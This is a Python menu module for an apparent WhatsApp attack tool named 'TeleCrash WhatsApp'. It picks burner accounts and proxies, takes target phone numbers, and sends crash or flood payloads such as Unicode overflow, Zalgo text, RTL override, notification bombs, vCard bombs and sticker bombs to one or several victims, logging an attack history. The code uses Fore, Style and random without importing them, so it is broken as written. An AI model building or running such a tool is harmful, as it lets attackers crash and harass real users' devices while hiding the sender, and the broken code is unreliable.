
"""
Menu System - Interactive menus for TeleCrash WhatsApp
"""

import time
from datetime import datetime

from config import Config
from core.burner_manager import BurnerManager
from core.session_tracker import SessionTracker
from core.target_resolver import TargetResolver
from core.proxy_manager import ProxyManager
from engines.delivery_orchestrator import DeliveryOrchestrator
from payloads.payload_generator import PayloadGenerator
from clipboard.auto_copy import AutoCopy
from clipboard.manual_export import ManualExport


class MainMenu:
    """Main menu system"""
    
    def __init__(self, burner_mgr: BurnerManager, session_tracker: SessionTracker):
        self.burner_mgr = burner_mgr
        self.session_tracker = session_tracker
        self.target_resolver = TargetResolver()
        self.proxy_mgr = ProxyManager()
        self.payload_gen = PayloadGenerator()
        self.auto_copy = AutoCopy()
        self.manual_export = ManualExport()
        self.orchestrator = DeliveryOrchestrator()
    
    def run(self):
        """Run main menu loop"""
        while True:
            self._display_menu()
            choice = input("\n[?] Select option: ").strip()
            
            if choice == '0':
                print("[!] Exiting TeleCrash WhatsApp.")
                break
            elif choice == '1':
                self._single_attack()
            elif choice == '2':
                self._mass_attack()
            elif choice == '3':
                self._burner_management()
            elif choice == '4':
                self._payload_generator()
            elif choice == '5':
                self._proxy_management()
            elif choice == '6':
                self._show_history()
            else:
                print("[!] Invalid choice.")
            
            input("\n[?] Press Enter to continue...")
    
    def _display_menu(self):
        """Display main menu"""
        from ui.banner import display_banner
        display_banner()
        
        print(f"{Fore.WHITE}   ┌──────────────────────────────────────────────────────┐")
        print(f"   │                 MAIN MENU                            │")
        print(f"   ├──────────────────────────────────────────────────────┤")
        print(f"   │ {Fore.RED}1{Fore.WHITE}. Single Target Attack                              │")
        print(f"   │ {Fore.RED}2{Fore.WHITE}. Mass Attack (≤5 targets)                          │")
        print(f"   │ {Fore.RED}3{Fore.WHITE}. Burner Account Manager                           │")
        print(f"   │ {Fore.RED}4{Fore.WHITE}. Payload Generator                                 │")
        print(f"   │ {Fore.RED}5{Fore.WHITE}. Proxy Configuration                               │")
        print(f"   │ {Fore.RED}6{Fore.WHITE}. Attack History                                    │")
        print(f"   │ {Fore.RED}0{Fore.WHITE}. Exit                                               │")
        print(f"   └──────────────────────────────────────────────────────┘")
    
    def _select_platform(self):
        """Select target platform"""
        print(f"\n{Fore.YELLOW}   Platform:{Style.RESET_ALL}")
        print(f"   1. Android")
        print(f"   2. iOS")
        print(f"   3. Universal")
        
        choice = input("   Choose (1-3): ").strip()
        
        if choice == '1':
            return 'android'
        elif choice == '2':
            return 'ios'
        else:
            return 'universal'
    
    def _select_payload(self):
        """Select payload type"""
        print(f"\n{Fore.MAGENTA}   Payload:{Style.RESET_ALL}")
        print(f"   1. Unicode Overflow")
        print(f"   2. Invisible Flood")
        print(f"   3. Zalgo Corruption")
        print(f"   4. RTL Override")
        print(f"   5. Massive Spam")
        print(f"   6. Notification Bomb")
        print(f"   7. vCard Bomb")
        print(f"   8. Sticker Bomb")
        print(f"   9. Backup Trigger")
        print(f"   10. Full Arsenal")
        
        choice = input("   Choose (1-10): ").strip()
        
        mapping = {
            '1': 'unicode',
            '2': 'invisible',
            '3': 'zalgo',
            '4': 'rtl',
            '5': 'massive',
            '6': 'notification',
            '7': 'vcard',
            '8': 'sticker',
            '9': 'backup',
            '10': 'full',
        }
        
        return mapping.get(choice, 'unicode')
    
    def _single_attack(self):
        """Single target attack"""
        print(f"\n{Fore.CYAN}[⚡] SINGLE TARGET ATTACK{Style.RESET_ALL}")
        
        # Get target
        target = input(f"{Fore.YELLOW}[?] Target number (+254...): {Style.RESET_ALL}").strip()
        target = self.target_resolver.validate_phone(target)
        
        if not target:
            print(f"{Fore.RED}[!] Invalid phone number.{Style.RESET_ALL}")
            return
        
        
        platform = self._select_platform()
        
      
        payload_type = self._select_payload()
        
        
        burner = self.burner_mgr.select_best_burner()
        
        if not burner:
            print(f"{Fore.RED}[!] No burner available.{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Using burner: {burner}{Style.RESET_ALL}")
        
        
        self.session_tracker.start_session(burner)
        self.session_tracker.add_target(target)
        
      
        self._execute_attack(burner, target, payload_type, platform)
        
        
        self.session_tracker.end_session()
    
    def _mass_attack(self):
        """Mass attack (up to 5 targets)"""
        print(f"\n{Fore.CYAN}[⚡] MASS ATTACK (Max 5 targets){Style.RESET_ALL}")
        
        
        targets_input = input(f"{Fore.YELLOW}[?] Enter numbers (comma separated) or file path: {Style.RESET_ALL}").strip()
        targets = self.target_resolver.parse_target_input(targets_input)
        
        if not targets:
            print(f"{Fore.RED}[!] No valid targets.{Style.RESET_ALL}")
            return
        
        if len(targets) > 5:
            print(f"{Fore.RED}[!] Maximum 5 targets per session.{Style.RESET_ALL}")
            targets = targets[:5]
        
        
        platform = self._select_platform()
        
        
        payload_type = self._select_payload()
        
        
        burner = self.burner_mgr.select_best_burner()
        
        if not burner:
            print(f"{Fore.RED}[!] No burner available.{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Using burner: {burner}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Targets ({len(targets)}):{Style.RESET_ALL}")
        for t in targets:
            print(f"    - {t}")
        
        
        self.session_tracker.start_session(burner)
        
        
        for i, target in enumerate(targets):
            print(f"\n{Fore.CYAN}[*] Target {i+1}/{len(targets)}: {target}{Style.RESET_ALL}")
            self.session_tracker.add_target(target)
            
            self._execute_attack(burner, target, payload_type, platform)
            
            if i < len(targets) - 1:
                delay = random.randint(
                    Config.MIN_DELAY_BETWEEN_TARGETS,
                    Config.MAX_DELAY_BETWEEN_TARGETS
                )
                print(f"{Fore.YELLOW}[*] Cooldown {delay}s...{Style.RESET_ALL}")
                time.sleep(delay)
        
        
        self.session_tracker.end_session()
    
    def _execute_attack(self, burner: str, target: str, payload_type: str, platform: str):
        """Execute attack with selected payload"""
        proxy_config = self.proxy_mgr.get_active_proxy()
        
        
        engine = self.orchestrator.select_engine(burner, proxy_config)
        
        if not engine:
            print(f"{Fore.RED}[!] Failed to initialize engine.{Style.RESET_ALL}")
            return
        
        
        if not self.orchestrator.connect():
            print(f"{Fore.RED}[!] Failed to connect.{Style.RESET_ALL}")
            return
        
        try:
            if payload_type == 'full':
                
                payloads = [
                    ('unicode', self.payload_gen.unicode_overflow(platform)),
                    ('invisible', self.payload_gen.invisible_flood(platform)),
                    ('zalgo', self.payload_gen.zalgo_corruption(platform)),
                    ('rtl', self.payload_gen.rtl_override(platform)),
                    ('massive', self.payload_gen.massive_spam(platform)),
                    ('notification', self.payload_gen.notification_bomb(platform)),
                ]
                
                for name, payload in payloads:
                    print(f"{Fore.CYAN}[*] Sending {name} payload...{Style.RESET_ALL}")
                    
                  
                    self.auto_copy.copy_text(payload)
                    
                    
                    self.manual_export.save_text_payload(payload, name, platform)
                    
                    
                    if self.orchestrator.send_text(target, payload):
                        print(f"{Fore.GREEN}[+] Sent {name} payload.{Style.RESET_ALL}")
                    
                    time.sleep(random.uniform(2, 8))  # Random delay
            
            elif payload_type == 'vcard':
                
                from payloads.vcard_bomb import VCardBombPayload
                vcard_gen = VCardBombPayload()
                vcard = vcard_gen.generate()
                filepath = self.manual_export.save_vcard(vcard)
                
                
                if self.orchestrator.send_file(target, filepath, "Contact", "document"):
                    print(f"{Fore.GREEN}[+] vCard bomb sent.{Style.RESET_ALL}")
                
                
                self.auto_copy.copy_file_path(filepath)
            
            elif payload_type == 'sticker':
                
                from payloads.sticker_bomb import StickerBombPayload
                sticker_gen = StickerBombPayload()
                sticker_bytes = sticker_gen.generate(5)
                filepath = self.manual_export.save_binary_payload(sticker_bytes, "sticker_bomb")
                
                
                if self.orchestrator.send_file(target, filepath, "", "sticker"):
                    print(f"{Fore.GREEN}[+] Sticker bomb sent.{Style.RESET_ALL}")
            
            else:
                
                payload = self.payload_gen.generate(payload_type, platform)
                
                if payload:
                    
                    self.auto_copy.copy_text(payload)
                    
                    
                    self.manual_export.save_text_payload(payload, payload_type, platform)
                    
                    
                    if self.orchestrator.send_text(target, payload):
                        print(f"{Fore.GREEN}[+] Payload sent to {target}{Style.RESET_ALL}")
                        self.burner_mgr.record_attack_result(burner, True)
                    else:
                        self.burner_mgr.record_attack_result(burner, False)
        
        except Exception as e:
            print(f"{Fore.RED}[!] Attack error: {e}{Style.RESET_ALL}")
        finally:
            self.orchestrator.close()
    
    def _burner_management(self):
        """Manage burner accounts"""
        print(f"\n{Fore.CYAN}   BURNER ACCOUNT MANAGER{Style.RESET_ALL}")
        print(self.burner_mgr.get_burner_health_report())
        
        print(f"\n   Options:")
        print(f"   1. Add Burner")
        print(f"   2. Remove Burner")
        print(f"   3. Back")
        
        choice = input("   Choose: ").strip()
        
        if choice == '1':
            phone = input("   Phone number (+254...): ").strip()
            session = input("   Session name (optional): ").strip()
            self.burner_mgr.add_burner(phone, session)
        elif choice == '2':
            phone = input("   Phone number to remove: ").strip()
            self.burner_mgr.remove_burner(phone)
    
    def _payload_generator(self):
        """Generate payload without sending"""
        print(f"\n{Fore.CYAN}   PAYLOAD GENERATOR{Style.RESET_ALL}")
        
        platform = self._select_platform()
        payload_type = self._select_payload()
        
        payload = self.payload_gen.generate(payload_type, platform)
        
        if payload:
            
            self.auto_copy.copy_text(payload)
            
            
            self.manual_export.save_text_payload(payload, payload_type, platform)
            
            print(f"\n{Fore.GREEN}[+] Payload generated ({len(payload)} chars){Style.RESET_ALL}")
            print(f"{Fore.WHITE}   Preview: {payload[:100]}...{Style.RESET_ALL}")
    
    def _proxy_management(self):
        """Manage proxies"""
        print(f"\n{Fore.CYAN}   PROXY CONFIGURATION{Style.RESET_ALL}")
        
        active = self.proxy_mgr.get_active_proxy()
        if active:
            print(f"   Active proxy: {active['name']} ({active['host']}:{active['port']})")
        else:
            print(f"   No active proxy.")
        
        print(f"\n   Options:")
        print(f"   1. Add Proxy")
        print(f"   2. Enable Proxy")
        print(f"   3. Disable All")
        print(f"   4. Test Proxy")
        print(f"   5. Back")
        
        choice = input("   Choose: ").strip()
        
        if choice == '1':
            name = input("   Proxy name: ").strip()
            host = input("   Host: ").strip()
            port = input("   Port: ").strip()
            username = input("   Username (optional): ").strip()
            password = input("   Password (optional): ").strip()
            self.proxy_mgr.add_proxy(name, host, port, username, password)
        elif choice == '2':
            name = input("   Proxy name to enable: ").strip()
            self.proxy_mgr.enable_proxy(name)
        elif choice == '3':
            self.proxy_mgr.disable_all()
            print("[+] All proxies disabled.")
        elif choice == '4':
            name = input("   Proxy name to test: ").strip()
            self.proxy_mgr.test_proxy(name)
    
    def _show_history(self):
        """Show attack history"""
        print(f"\n{Fore.CYAN}   ATTACK HISTORY{Style.RESET_ALL}")
        print(self.session_tracker.get_session_summary())
